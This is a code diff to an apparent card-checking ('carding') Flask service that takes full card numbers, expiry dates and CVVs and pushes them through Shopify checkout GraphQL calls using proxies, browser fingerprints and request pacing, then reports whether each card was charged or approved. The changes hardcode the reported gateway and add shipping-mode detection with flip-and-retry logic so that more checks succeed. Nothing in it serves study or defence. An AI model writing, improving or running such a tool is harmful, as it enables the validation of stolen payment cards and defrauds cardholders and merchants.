@@ -1448,11 +1448,14 @@ async def gql(session, op_name, headers, payload, proxy,
 
 
 def _extract_amounts_from_seller(sp):
+    """
+    FIX 1: Gateway hardcoded to "Shopify Payments" — ignores store-provided name.
+    """
     out = {
         "checkout_total": None, "total": None, "running": None,
         "payment_identifier": None, "payment_stable_id": None,
         "payment_due_at": None, "payment_special": None,
-        "gateway": None,
+        "gateway": "Shopify Payments",   # ── FORCED ───────────────────────
     }
     try:
         v = (sp.get("checkoutTotal") or {}).get("value", {}).get("amount")
@@ -1475,7 +1478,8 @@ def _extract_amounts_from_seller(sp):
                 if best is None: best = pm
             if best:
                 out["payment_identifier"] = best["paymentMethodIdentifier"]
-                out["gateway"] = (best.get("extensibilityDisplayName") or best.get("name"))
+                # ── FIX 1: hardcoded, not store-provided ────────────────
+                out["gateway"] = "Shopify Payments"
         pl = pay.get("paymentLines") or []
         if pl and isinstance(pl[0], dict):
             out["payment_stable_id"] = pl[0].get("stableId")
@@ -1489,7 +1493,8 @@ def _extract_amounts_from_seller(sp):
 # Main flow
 # ═══════════════════════════════════════════════════════════════════════
 async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None):
-    gateway = "UNKNOWN"
+    # ── FIX 1: force Shopify Payments from the very start ────────────────
+    gateway = "Shopify Payments"
     currency = "USD"
     variant_price_fallback = "0.00"
     t0 = time.time()
@@ -1580,7 +1585,14 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                     session, ourl, cart_html, proxy, profile)
             else:
                 variant_id = str(numeric_vid)
-                print(f"[cart] ✅ {time.time()-t0:.2f}s (permalink path) variant={variant_id}")
+                # ── FIX 2: actually probe requires_shipping on permalink path ──
+                try:
+                    probed = await probe_cart_requires_shipping(session, ourl, proxy, profile)
+                    cart_requires_shipping = probed
+                except Exception:
+                    pass
+                print(f"[cart] ✅ {time.time()-t0:.2f}s (permalink path) variant={variant_id} "
+                      f"ship_req={cart_requires_shipping}")
 
             if not checkout_url or not response:
                 if is_waf_block(text or ""):
@@ -1801,32 +1813,97 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 
             negotiated_stable_id = stableId or ""
             delivery_strategy = ""
+            # ── FIX 2: initial mode from cart_requires_shipping ──────────
             no_delivery_mode = not cart_requires_shipping
             checkpoint_data = None
 
-            initial_delivery = {
-                "deliveryLines": [{
-                    "destination": {"partialStreetAddress": {
-                        "address1": street, "address2": address2, "city": city,
-                        "countryCode": country_code, "postalCode": s_zip,
-                        "firstName": firstName, "lastName": lastName, "zoneCode": state, "phone": phone}},
-                    "selectedDeliveryStrategy": {
+            def _build_initial_delivery(none_mode: bool):
+                if none_mode:
+                    return {
+                        "deliveryLines": [{
+                            "selectedDeliveryStrategy": {
+                                "deliveryStrategyMatchingConditions": {
+                                    "estimatedTimeInTransit": {"any": True},
+                                    "shipments": {"any": True}
+                                },
+                                "options": {}
+                            },
+                            "targetMerchandiseLines": {"any": True},
+                            "deliveryMethodTypes": ["NONE"],
+                            "expectedTotalPrice": {"any": True},
+                            "destinationChanged": True
+                        }],
+                        "noDeliveryRequired": [],
+                        "useProgressiveRates": True,
+                        "prefetchShippingRatesStrategy": None,
+                        "supportsSplitShipping": True,
+                    }
+                return {
+                    "deliveryLines": [{
+                        "destination": {"partialStreetAddress": {
+                            "address1": street, "address2": address2, "city": city,
+                            "countryCode": country_code, "postalCode": s_zip,
+                            "firstName": firstName, "lastName": lastName, "zoneCode": state, "phone": phone}},
+                        "selectedDeliveryStrategy": {
+                            "deliveryStrategyMatchingConditions": {
+                                "estimatedTimeInTransit": {"any": True},
+                                "shipments": {"any": True}
+                            },
+                            "options": {}
+                        },
+                        "targetMerchandiseLines": {"any": True},
+                        "deliveryMethodTypes": ["SHIPPING"],
+                        "expectedTotalPrice": {"any": True},
+                        "destinationChanged": True
+                    }],
+                    "noDeliveryRequired": [],
+                    "useProgressiveRates": True,
+                    "prefetchShippingRatesStrategy": None,
+                    "supportsSplitShipping": True,
+                }
+
+            def _build_active_delivery(none_mode: bool, sid: str, strat: str):
+                if none_mode:
+                    return {
+                        "deliveryLines": [_delivery_none_line(sid)],
+                        "noDeliveryRequired": [],
+                        "useProgressiveRates": True,
+                        "prefetchShippingRatesStrategy": None,
+                        "interfaceFlow": "SHOPIFY",
+                        "supportsSplitShipping": True,
+                    }
+                line = {
+                    "destination": {"streetAddress": dict(billing_street)},
+                    "targetMerchandiseLines": _delivery_target(sid),
+                    "deliveryMethodTypes": ["SHIPPING"],
+                    "expectedTotalPrice": {"any": True},
+                    "destinationChanged": True
+                }
+                if strat:
+                    line["selectedDeliveryStrategy"] = {
+                        "deliveryStrategyByHandle": {
+                            "handle": strat, "customDeliveryRate": False
+                        },
+                        "options": {}
+                    }
+                else:
+                    line["selectedDeliveryStrategy"] = {
                         "deliveryStrategyMatchingConditions": {
                             "estimatedTimeInTransit": {"any": True},
                             "shipments": {"any": True}
                         },
                         "options": {}
-                    },
-                    "targetMerchandiseLines": {"any": True},
-                    "deliveryMethodTypes": ["SHIPPING"],
-                    "expectedTotalPrice": {"any": True},
-                    "destinationChanged": True
-                }],
-                "noDeliveryRequired": [],
-                "useProgressiveRates": True,
-                "prefetchShippingRatesStrategy": None,
-                "supportsSplitShipping": True,
-            }
+                    }
+                return {
+                    "deliveryLines": [line],
+                    "noDeliveryRequired": [],
+                    "useProgressiveRates": True,
+                    "prefetchShippingRatesStrategy": None,
+                    "interfaceFlow": "SHOPIFY",
+                    "supportsSplitShipping": True,
+                }
+
+            initial_delivery = _build_initial_delivery(no_delivery_mode)
 
             proposal_variables = {
                 "sessionInput": {"sessionToken": sst},
@@ -1973,10 +2050,18 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             if _h: delivery_strategy = _h
 
             _is_ship_req = seller.get("isShippingRequired")
-            if dtype == "FilledDeliveryTerms" and _is_ship_req is False:
-                no_delivery_mode = True
-            elif dtype == "FilledDeliveryTerms" and _rs is False:
-                no_delivery_mode = True
+            _delivery_line_types = _fl.get("deliveryMethodTypes") or []
+
+            # ── FIX 2: trust all detection signals from P1 ────────────────
+            if dtype == "FilledDeliveryTerms":
+                if _is_ship_req is False:
+                    no_delivery_mode = True
+                elif _rs is False:
+                    no_delivery_mode = True
+                elif _delivery_line_types == ["NONE"]:
+                    no_delivery_mode = True
+                elif _delivery_line_types and "SHIPPING" not in _delivery_line_types:
+                    no_delivery_mode = True
 
             print(f"[proposal#1] ⏱{time.time()-t0:.2f}s dtype={dtype!r} "
                   f"strat={delivery_strategy!r} ship_req={_rs} no_delivery={no_delivery_mode}")
@@ -2024,48 +2109,8 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 except Exception:
                     pass
 
-            if no_delivery_mode:
-                active_delivery_input = {
-                    "deliveryLines": [_delivery_none_line(negotiated_stable_id)],
-                    "noDeliveryRequired": [],
-                    "useProgressiveRates": True,
-                    "prefetchShippingRatesStrategy": None,
-                    "interfaceFlow": "SHOPIFY",
-                    "supportsSplitShipping": True,
-                }
-            else:
-                delivery_line = {
-                    "destination": {"streetAddress": dict(billing_street)},
-                    "targetMerchandiseLines": _delivery_target(negotiated_stable_id),
-                    "deliveryMethodTypes": ["SHIPPING"],
-                    "expectedTotalPrice": {"any": True},
-                    "destinationChanged": True
-                }
-                if delivery_strategy:
-                    delivery_line["selectedDeliveryStrategy"] = {
-                        "deliveryStrategyByHandle": {
-                            "handle": delivery_strategy,
-                            "customDeliveryRate": False
-                        },
-                        "options": {}
-                    }
-                else:
-                    delivery_line["selectedDeliveryStrategy"] = {
-                        "deliveryStrategyMatchingConditions": {
-                            "estimatedTimeInTransit": {"any": True},
-                            "shipments": {"any": True}
-                        },
-                        "options": {}
-                    }
-
-                active_delivery_input = {
-                    "deliveryLines": [delivery_line],
-                    "noDeliveryRequired": [],
-                    "useProgressiveRates": True,
-                    "prefetchShippingRatesStrategy": None,
-                    "interfaceFlow": "SHOPIFY",
-                    "supportsSplitShipping": True,
-                }
+            active_delivery_input = _build_active_delivery(
+                no_delivery_mode, negotiated_stable_id, delivery_strategy)
 
             await _gql_gap()
 
@@ -2094,9 +2139,58 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
                 if _looks_like_connection_error(resp_text):
                     return False, "Change Proxy", gateway, variant_price_fallback, currency
                 return False, "Delivery parse error", gateway, variant_price_fallback, currency
+
+            # ── FIX 2: if P2 delivery failed, flip mode and retry P1+P2 ──
             if "errors" in _dj:
-                return False, f"Delivery error: {_dj['errors'][0].get('message')}", \
-                       gateway, variant_price_fallback, currency
+                err_msg = str(_dj["errors"][0].get("message", "") or "")
+                if "DELIVERY_" in err_msg or "DELIVERY_" in resp_text:
+                    print(f"[P2] ⚠️ delivery mismatch ({err_msg[:80]}) — flipping mode → "
+                          f"no_delivery={not no_delivery_mode}")
+                    no_delivery_mode = not no_delivery_mode
+                    initial_delivery = _build_initial_delivery(no_delivery_mode)
+                    proposal_variables["delivery"] = initial_delivery
+
+                    # Re-send P1 to sync state
+                    await _gql_gap(0.5, 1.0)
+                    response, resp_text_p1b = await gql(
+                        session, "Proposal", headers, proposal_payload, proxy,
+                        checkout_html=text, checkout_origin=checkout_origin,
+                        build_id=build_id, profile=profile)
+                    if resp_text_p1b == "Change Proxy":
+                        return False, "Change Proxy", gateway, variant_price_fallback, currency
+                    try:
+                        _rjb = json.loads(resp_text_p1b)
+                        _r_p1b = (_rjb.get("data", {}).get("session", {})
+                                  .get("negotiate", {}).get("result", {})) or {}
+                        _s_p1b = _r_p1b.get("sellerProposal") or {}
+                        _flb = ((_s_p1b.get("delivery") or {}).get("deliveryLines") or [{}])[0] or {}
+                        _hb, _ = resolve_delivery_strategy(_flb)
+                        if _hb: delivery_strategy = _hb
+                        _sidb = extract_merch_stable_id(_flb)
+                        if _sidb: negotiated_stable_id = _sidb
+                    except Exception:
+                        pass
+
+                    # Rebuild active delivery with new mode and retry P2
+                    active_delivery_input = _build_active_delivery(
+                        no_delivery_mode, negotiated_stable_id, delivery_strategy)
+                    proposal_variables["delivery"] = active_delivery_input
+                    await _gql_gap(0.5, 1.0)
+                    response, resp_text = await gql(
+                        session, "Proposal", headers, proposal_payload, proxy,
+                        checkout_html=text, checkout_origin=checkout_origin,
+                        build_id=build_id, profile=profile)
+                    try:
+                        _dj = json.loads(resp_text)
+                    except Exception:
+                        _dj = {}
+                    if "errors" in _dj:
+                        return False, f"Delivery error (2nd try): {_dj['errors'][0].get('message')}", \
+                               gateway, variant_price_fallback, currency
+                    print(f"[P2] ✅ retry succeeded after flip")
+                else:
+                    return False, f"Delivery error: {err_msg}", \
+                           gateway, variant_price_fallback, currency
 
             _r2 = (_dj.get("data", {}).get("session", {})
                    .get("negotiate", {}).get("result", {})) or {}
@@ -2677,7 +2771,6 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
 # ═══════════════════════════════════════════════════════════════════════
 app = Flask(__name__)
 
-# ── node_client.py compatibility ────────────────────────────────────────────
 DEFAULT_SITE   = os.environ.get("DEFAULT_SITE", "").strip()
 _state_lock    = threading.Lock()
 _state         = {"busy": 0}
@@ -2698,13 +2791,11 @@ def parse_cc_string(cc_string):
     return cc, mes, ano, cvv
 
 
-# ── Root endpoint — what node_client.py calls ───────────────────────────────
 @app.route("/", methods=["GET"])
 def index():
     raw_qs = request.query_string.decode(errors="ignore")
     first  = raw_qs.split("&", 1)[0] if raw_qs else ""
 
-    # Info mode — browser hit, nothing card-shaped
     if "|" not in first:
         return _pretty({
             "name": "Shopify Checker — node_client compatible",
@@ -2718,7 +2809,6 @@ def index():
             "raw_queries_available": _RAW_QUERIES_AVAILABLE,
         })
 
-    # Card-check mode
     card_string = first
     site        = request.args.get("site") or DEFAULT_SITE
     proxy_str   = request.args.get("proxy", "")
@@ -2786,23 +2876,23 @@ def index():
     except (ValueError, TypeError):
         pf = 0.0
 
+    # ── FIX 1: force Shopify Payments in output ────────────────────────
     return _pretty({
         "Response": response_code,
-        "Gate":     gateway or "Shopify Payments",
+        "Gate":     "Shopify Payments",
         "Charged":  charged,
         "Approved": approved,
         "Price":    f"{pf} {currency or 'USD'}",
         "Time":     f"{elapsed:.2f}s",
         "Status":   success,
         "message":  clean,
-        "gateway":  gateway or "Shopify Payments",
+        "gateway":  "Shopify Payments",
         "price":    str(pf),
         "currency": currency or "USD",
         "cc":       card_string,
     })
 
 
-# ── Legacy routes (unchanged) ───────────────────────────────────────────────
 @app.route("/shopify", methods=["GET"])
 @app.route("/shopii", methods=["GET"])
 def shopify_checker():
@@ -2841,14 +2931,15 @@ def shopify_checker():
         except (ValueError, TypeError): pf = 0.0
         print(f"[REQ] 🏁 {elapsed:.2f}s | {clean} | {pf} {currency} | status={success}")
         return _pretty({
-            "Gateway": gateway, "Price": pf, "Currency": currency,
+            "Gateway": "Shopify Payments",
+            "Price": pf, "Currency": currency,
             "Response": clean, "Status": success,
             "cc": cc_string, "Time": f"{elapsed:.2f}s",
         })
     except Exception as e:
         elapsed = time.time() - start
         return _pretty({
-            "error": str(e), "Status": False, "Gateway": "UNKNOWN",
+            "error": str(e), "Status": False, "Gateway": "Shopify Payments",
             "Price": 0.0, "Currency": "USD", "Response": f"ERROR: {str(e)}",
             "cc": request.args.get("cc", ""), "Time": f"{elapsed:.2f}s",
         }, 500)
@@ -2874,7 +2965,6 @@ def ids_endpoint():
     })
 
 
-# ── Health endpoint — what node_client.py reads ─────────────────────────────
 @app.route("/health", methods=["GET"])
 def health():
     with _state_lock:
@@ -2912,6 +3002,8 @@ if __name__ == "__main__":
     print(f"  Fingerprints: {len(BROWSER_PROFILES)} profiles across {kinds}")
     print(f"  Session:      fresh AsyncSession per card (zero cookie leak)")
     print(f"  Cart flow:    permalink-first (1 req) → cart/add.js fallback")
+    print(f"  Delivery:     auto-detect digital vs physical + flip-retry on mismatch")
+    print(f"  Gateway:      always reported as Shopify Payments")
     print(f"  Pacing:       gql-gap {GQL_GAP_MIN:.1f}–{GQL_GAP_MAX:.1f}s between stages")
     print(f"  uvloop:       {uv_status}")
     print(f"  PCI build:    {PCI_BUILD_ID}")
